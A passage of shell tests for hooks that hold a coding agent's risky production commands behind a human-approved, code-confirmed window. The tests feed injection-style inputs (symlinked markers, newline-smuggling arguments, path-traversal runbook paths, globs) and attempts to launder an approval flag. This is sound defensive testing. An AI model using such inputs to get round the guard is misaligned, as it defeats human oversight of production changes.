  cw_marker_put tu7 "ssh prod.example.com 'b'"
  run_hook close-window.sh "$(cw_fail tu7)"
  marker other; [ "$status" -eq 0 ]
  marker tu7; [ "$status" -eq 1 ]
}

@test "close: a symlinked marker is not followed; window kept, link left in place" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  lib 'printf "%s\n" "$(mk_tmp careful-window-running-tu8)"'
  mf="$output"
  printf 'ssh prod.example.com victim\n' > "$PROJ/victim"
  ln -s "$PROJ/victim" "$mf"
  run_hook close-window.sh "$(cw_fail tu8)"
  [ -z "$output" ]
  cw_window_open
  [ -L "$mf" ] && [ -f "$PROJ/victim" ]
  rm -f "$mf"
}

@test "close: session mismatch closes only the payload session's window" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  lib "mk_careful_window_open other-sess 30 'host:prod.example.com'"; [ "$status" -eq 0 ]
  cw_marker_put tu9 "ssh prod.example.com 'z'"
  run_hook close-window.sh "$(cw_fail tu9 x '.session_id="other-sess"')"
  [ -z "$output" ]
  cw_window_open
  lib "mk_careful_window_get other-sess >/dev/null"; [ "$status" -ne 0 ]
}

@test "close: MEMOKIT_CAREFUL_OFF=1 does nothing" {
  mk_project "$WCFG"
  open_window 'host:prod.example.com'
  cw_marker_put tu10 "ssh prod.example.com 'z'"
  MEMOKIT_CAREFUL_OFF=1 run_hook close-window.sh "$(cw_fail tu10)"
  [ -z "$output" ]
  cw_window_open
  marker tu10; [ "$status" -eq 0 ]
}

@test "close: old running markers are pruned, fresh ones kept" {
  mk_project "$WCFG"
  cw_marker_put oldone "x"; cw_marker_put newone "y"
  lib 'printf "%s\n" "$(mk_tmp careful-window-running-oldone)"'
  touch -t 202001010000 "$output"
  run_hook close-window.sh "$(cw_fail tu11)"
  marker oldone; [ "$status" -eq 1 ]
  marker newone; [ "$status" -eq 0 ]
}

# --- memokit-window.sh request ---

WIN="$HOOKS/memokit-window.sh"
# req ARGS... -- run the script as the main session in $PROJ (stderr merged).
req() { run env -u CLAUDE_CODE_CHILD_SESSION CLAUDE_CODE_SESSION_ID="$WSID" CLAUDE_PROJECT_DIR="$PROJ" "$MK_BASH" "$WIN" "$@"; }
# first_code -- the 6-hex code of the first output line.
first_code() { printf '%s\n' "$output" | head -n 1 | grep -oE '\b[0-9a-f]{6}\b' | head -n 1; }

@test "request: valid targets print a code and write pending with those targets" {
  mk_project "$WCFG"
  req request host:prod.example.com branch:deploy
  [ "$status" -eq 0 ]
  c="$(first_code)"; [ "${#c}" -eq 6 ]
  printf '%s\n' "$output" | head -n 1 | grep -qF 'branch:deploy host:prod.example.com' || { echo "$output"; false; }
  printf '%s\n' "$output" | head -n 1 | grep -qF '30 minutes'
  printf '%s' "$output" | grep -qF 'CHANGE PLAN'
  printf '%s' "$output" | grep -qF "'onay $c'"
  lib "mk_careful_pending_get $WSID $c"
  [ "$status" -eq 0 ]
  set -- $output
  [ "$1" = "$c" ] && [ "$3" = branch:deploy ] && [ "$4" = host:prod.example.com ] && [ "$#" -eq 4 ]
}

@test "request: runbook:<path> is stored with its sha256" {
  mk_project "$WCFG"; mk_runbook
  req request "runbook:$RB"
  [ "$status" -eq 0 ]
  c="$(first_code)"
  lib "mk_careful_pending_get $WSID $c"
  [ "$status" -eq 0 ]
  set -- $output
  [ "$3" = "runbook:$RB@$RB_SHA" ]
}

@test "request: unknown target exits 2 and names the allowed set" {
  mk_project "$WCFG"
  req request host:evil.example.org
  [ "$status" -eq 2 ]
  printf '%s' "$output" | grep -qF 'host:evil.example.org'
  printf '%s' "$output" | grep -qF 'host:prod.example.com'
  printf '%s' "$output" | grep -qF 'branch:deploy'
  printf '%s' "$output" | grep -qF 'k8s'
  printf '%s' "$output" | grep -qF 'runbook:'
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: no targets exits 6" {
  mk_project "$WCFG"
  req request
  [ "$status" -eq 6 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: CLAUDE_CODE_CHILD_SESSION=1 exits 4 and writes nothing" {
  mk_project "$WCFG"
  run env CLAUDE_CODE_CHILD_SESSION=1 CLAUDE_CODE_SESSION_ID="$WSID" CLAUDE_PROJECT_DIR="$PROJ" "$MK_BASH" "$WIN" request host:prod.example.com
  [ "$status" -eq 4 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: without remote block exits 5" {
  mk_project
  req request host:prod.example.com
  [ "$status" -eq 5 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: missing session id exits 3" {
  mk_project "$WCFG"
  run env -u CLAUDE_CODE_CHILD_SESSION -u CLAUDE_CODE_SESSION_ID CLAUDE_PROJECT_DIR="$PROJ" "$MK_BASH" "$WIN" request host:prod.example.com
  [ "$status" -eq 3 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: unknown subcommand exits 2" {
  mk_project "$WCFG"
  req frobnicate host:prod.example.com
  [ "$status" -eq 2 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: a later deny for the same targets shows the same code" {
  mk_project "$WCFG"
  req request host:prod.example.com branch:deploy
  c="$(first_code)"
  gd "ssh prod.example.com 'git push origin deploy'"
  [ "$(decision)" = deny ]
  [ "$(code_of "$(reason)")" = "$c" ] || { echo "$c vs $(reason)"; false; }
}

@test "request: after a guard deny leaves an unflagged pending line with the request's targets" {
  mk_project "$WCFG"
  gd "ssh prod.example.com 'systemctl restart x'"
  [ "$(decision)" = deny ]
  req request host:prod.example.com branch:deploy
  [ "$status" -eq 0 ]
  c="$(first_code)"
  lib "mk_careful_pending_get $WSID"
  set -- $output
  [ "$1" = "$c" ]
  case "$2" in *'!') false ;; esac
  [ "$3" = branch:deploy ] && [ "$4" = host:prod.example.com ]
}

@test "request: duplicate targets are de-duplicated" {
  mk_project "$WCFG"
  req request host:prod.example.com host:prod.example.com
  [ "$status" -eq 0 ]
  c="$(first_code)"
  lib "mk_careful_targets_code 'host:prod.example.com'"
  [ "$output" = "$c" ]
  lib "mk_careful_pending_get $WSID $c"
  set -- $output
  [ "$#" -eq 3 ]
}

@test "request: k8s:staging is accepted" {
  mk_project "$WCFG"
  req request k8s:staging
  [ "$status" -eq 0 ]
  lib "mk_careful_pending_get $WSID $(first_code)"
  set -- $output
  [ "$3" = k8s:staging ]
}

@test "request: a pattern target from careful.patterns is accepted" {
  mk_project '{"version":1,"project":{"name":"D","tag":"DMO"},"language":"en",
"careful":{"patterns":[{"match":"terraform apply","label":"tf","target":"infra"}]},
"remote":{"hosts":["prod.example.com"]}}'
  req request pattern:infra
  [ "$status" -eq 0 ]
  lib "mk_careful_pending_get $WSID $(first_code)"
  set -- $output
  [ "$3" = pattern:infra ]
}

@test "final M7: a pattern-target segment in a window gets the glob rule too" {
  mk_project '{"version":1,"project":{"name":"D","tag":"DMO"},"language":"en",
"careful":{"patterns":[{"match":"flyctl deploy","label":"fly","target":"fly-prod"}]},
"remote":{"hosts":["prod.example.com"]}}'
  open_window 'pattern:fly-prod'
  gd "flyctl deploy --app x" toolu_m7a
  [ -z "$output" ] || { echo "$(reason | cut -c1-160)"; false; }
  gd "flyctl deploy --config *.toml" toolu_m7b
  [ "$(decision)" = deny ] || { echo "a glob passed the window"; false; }
  gd "flyctl deploy --config 'x*.toml'" toolu_m7c
  [ "$(decision)" = deny ]
}

@test "request: host:PROD.example.com is accepted and stored in the configured spelling" {
  mk_project "$WCFG"
  req request host:PROD.example.com
  [ "$status" -eq 0 ]
  c="$(first_code)"
  lib "mk_careful_targets_code 'host:prod.example.com'"
  [ "$output" = "$c" ]
  lib "mk_careful_pending_get $WSID $c"
  set -- $output
  [ "$3" = host:prod.example.com ]
}

# --- memokit-window.sh request: fix round 1 ---

@test "request: request A then request B (different targets) flags the line" {
  mk_project "$WCFG"
  req request host:prod.example.com
  ca="$(first_code)"
  req request host:prod.example.com branch:deploy
  [ "$status" -eq 0 ]
  cb="$(first_code)"
  [ "$ca" != "$cb" ]
  lib "mk_careful_pending_get $WSID"
  set -- $output
  [ "$1" = "$cb" ]
  case "$2" in *'!') ;; *) echo "$output"; false ;; esac
}

@test "request: request A then request A again stays unflagged" {
  mk_project "$WCFG"
  req request host:prod.example.com
  ca="$(first_code)"
  req request host:prod.example.com
  [ "$status" -eq 0 ]
  [ "$(first_code)" = "$ca" ]
  lib "mk_careful_pending_get $WSID"
  set -- $output
  case "$2" in *'!') echo "$output"; false ;; esac
}

@test "request: deny, request, request(other) flags only the second request" {
  mk_project "$WCFG"
  gd "ssh prod.example.com 'systemctl restart x'"
  req request branch:deploy
  lib "mk_careful_pending_get $WSID"
  set -- $output
  case "$2" in *'!') echo "$output"; false ;; esac
  req request host:prod.example.com
  lib "mk_careful_pending_get $WSID"
  set -- $output
  case "$2" in *'!') ;; *) echo "$output"; false ;; esac
}

@test "request: the request record goes with the pending line when it is cleared" {
  mk_project "$WCFG"
  req request host:prod.example.com
  lib "mk_careful_pending_clear $WSID; [ ! -e \"\$(mk_careful_pending_req_file $WSID)\" ]"
  [ "$status" -eq 0 ]
}

@test "request: an argument with a newline, tab or CR exits 2 and writes nothing" {
  mk_project "$WCFG"
  req request $'host:prod.example.com\nbranch:deploy'
  [ "$status" -eq 2 ]
  req request $'host:prod.example.com\tx'
  [ "$status" -eq 2 ]
  req request $'host:prod.example.com\r'
  [ "$status" -eq 2 ]
  req request 'host:prod.example.com x'
  [ "$status" -eq 2 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: glob and space targets exit 2" {
  mk_project "$WCFG"
  req request 'host:*'
  [ "$status" -eq 2 ]
  req request 'branch:dep*'
  [ "$status" -eq 2 ]
  req request 'k8s:a b'
  [ "$status" -eq 2 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: invalid k8s context, unconfigured branch, unknown pattern exit 2" {
  mk_project "$WCFG"
  req request 'k8s:bad!ctx'
  [ "$status" -eq 2 ]
  req request branch:main
  [ "$status" -eq 2 ]
  req request pattern:nope
  [ "$status" -eq 2 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: bad runbook paths (.., //, missing, outside dir) exit 2" {
  mk_project "$WCFG"; mk_runbook
  printf 'x\n' > "$PROJ/.claude/memokit/other.sh"
  req request "runbook:.claude/memokit/runbooks/../other.sh"
  [ "$status" -eq 2 ]
  req request "runbook:.claude/memokit/runbooks//deploy.sh"
  [ "$status" -eq 2 ]
  req request "runbook:.claude/memokit/runbooks/missing.sh"
  [ "$status" -eq 2 ]
  req request "runbook:.claude/memokit/other.sh"
  [ "$status" -eq 2 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: a valid target next to an invalid one writes nothing" {
  mk_project "$WCFG"
  req request host:prod.example.com branch:main
  [ "$status" -eq 2 ]
  pending_file_exists; [ "$status" -eq 1 ]
}

@test "request: a session id with a slash and a newline is sanitised like the guard's" {
  mk_project "$WCFG"
  run env -u CLAUDE_CODE_CHILD_SESSION CLAUDE_CODE_SESSION_ID=$'a/b\nc' CLAUDE_PROJECT_DIR="$PROJ" "$MK_BASH" "$WIN" request host:prod.example.com
  [ "$status" -eq 0 ]
  c="$(first_code)"
  lib "mk_careful_pending_get a_b_c $c"
  [ "$status" -eq 0 ]
}

@test "request: hosts [\"*\"] error message prints host:<any> and no directory entries" {
  mk_project '{"version":1,"project":{"name":"D","tag":"DMO"},"language":"en",
"remote":{"deployBranches":["deploy"],"hosts":["*"]}}'
  touch "$PROJ/zzmarker.txt"
  cd "$PROJ"
  req request branch:main
  [ "$status" -eq 2 ]
  printf '%s' "$output" | grep -qF 'host:<any>'
  ! printf '%s' "$output" | grep -qF 'zzmarker'
  ! printf '%s' "$output" | grep -qF 'memokit.json'
}

@test "request: parity with the guard for ssh ... 'systemctl restart x'" {
  mk_project "$WCFG"
  req request host:prod.example.com
  c="$(first_code)"
  gd "ssh prod.example.com 'systemctl restart x'"
  [ "$(decision)" = deny ]
  [ "$(code_of "$(reason)")" = "$c" ] || { echo "$c vs $(reason)"; false; }
}

# --- fix round 2: the flag cannot be laundered through a guard deny ---

flag_of() { lib "mk_careful_pending_get $WSID"; set -- $output; printf '%s' "$2"; }

@test "request: request A, deny, request B (other targets) is flagged" {
  mk_project "$WCFG"
  req request host:prod.example.com
  gd "ssh prod.example.com 'systemctl restart x'"
  [ "$(decision)" = deny ]
  case "$(flag_of)" in *'!') echo unexpected-flag; false ;; esac
  req request branch:deploy
  [ "$status" -eq 0 ]
  case "$(flag_of)" in *'!') ;; *) false ;; esac
}

@test "request: request A, deny, request A again is unflagged" {
  mk_project "$WCFG"
  req request host:prod.example.com
  gd "ssh prod.example.com 'systemctl restart x'"
  req request host:prod.example.com
  [ "$status" -eq 0 ]
  case "$(flag_of)" in *'!') false ;; esac
}

@test "request: request A, approval consumption, request B is unflagged" {
  mk_project "$WCFG"
  req request host:prod.example.com
  lib "mk_careful_pending_clear $WSID"
  req request branch:deploy
  [ "$status" -eq 0 ]
  case "$(flag_of)" in *'!') false ;; esac
}

@test "request: an expired request record no longer flags" {
  mk_project "$WCFG"
  req request host:prod.example.com
  lib "printf 'abc123 1\n' > \"\$(mk_careful_pending_req_file $WSID)\""
  [ "$status" -eq 0 ]
  req request branch:deploy
  [ "$status" -eq 0 ]
  case "$(flag_of)" in *'!') false ;; esac
}

@test "request: a line already flagged stays flagged on a request, whoever wrote it" {
  mk_project "$WCFG"
  gd "ssh prod.example.com 'systemctl restart x'"
  gd "ssh 31.210.53.162 'systemctl restart x'"
  case "$(flag_of)" in *'!') ;; *) false ;; esac
  req request branch:deploy
  case "$(flag_of)" in *'!') ;; *) false ;; esac
}

@test "request: a record that cannot be written does not clear: the line is flagged" {
  mk_project "$WCFG"
  gd "ssh prod.example.com 'systemctl restart x'"
  lib "mkdir \"\$(mk_careful_pending_req_file $WSID)\""
  [ "$status" -eq 0 ]
  req request branch:deploy
  [ "$status" -eq 0 ]
  case "$(flag_of)" in *'!') ;; *) false ;; esac
}

@test "pending_get: dropping an expired pending line also drops an expired request record" {
  mk_project "$WCFG"
  lib "printf 'abc123 1 host:x\n' > \"\$(mk_careful_pending_file $WSID)\"; printf 'abc123 1\n' > \"\$(mk_careful_pending_req_file $WSID)\"; mk_careful_pending_get $WSID; [ ! -e \"\$(mk_careful_pending_file $WSID)\" ] && [ ! -e \"\$(mk_careful_pending_req_file $WSID)\" ]"
  [ "$status" -eq 0 ] || [ "$status" -eq 1 ]
  lib "[ ! -e \"\$(mk_careful_pending_file $WSID)\" ] && [ ! -e \"\$(mk_careful_pending_req_file $WSID)\" ]"
  [ "$status" -eq 0 ]
}

@test "pending_get: an unexpired request record survives an expired pending line" {
  mk_project "$WCFG"
  lib "printf 'abc123 1 host:x\n' > \"\$(mk_careful_pending_file $WSID)\"; mk_careful_pending_req_set $WSID abc123; mk_careful_pending_get $WSID; [ -e \"\$(mk_careful_pending_req_file $WSID)\" ]"
  lib "[ -e \"\$(mk_careful_pending_req_file $WSID)\" ]"
  [ "$status" -eq 0 ]
}
